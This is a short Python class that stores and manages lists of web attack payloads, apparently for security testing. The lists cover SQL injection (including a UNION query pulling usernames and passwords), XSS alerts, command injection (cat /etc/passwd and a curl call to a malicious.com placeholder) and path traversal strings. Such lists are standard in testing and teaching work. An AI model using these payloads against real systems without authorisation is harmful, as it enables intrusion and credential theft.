class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "' UNION SELECT username, password FROM users--",
                "' AND 1=2 --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "'><svg onload=alert('XSS')>",
            ],
            'command_injection': [
                "; ls -la",
                "|| cat /etc/passwd",
                "& curl http://malicious.com"
            ],
            'path_traversal': [
                "../etc/passwd",
                "..\..\Windows\System32\cmd.exe",
                "..//..//var//log//secure.log"
            ],
            'other': [
                "<iframe src='http://malicious.com'></iframe>",
                "' OR 1=1 --"
            ]
        }

    def get_payloads(self, attack_type):
        return self.payloads.get(attack_type, [])

    def add_payload(self, attack_type, payload):
        if attack_type in self.payloads:
            self.payloads[attack_type].append(payload)
        else:
            self.payloads[attack_type] = [payload]  

    def remove_payload(self, attack_type, payload):
        if attack_type in self.payloads:
            self.payloads[attack_type].remove(payload)

    def list_payloads(self):
        return self.payloads.keys()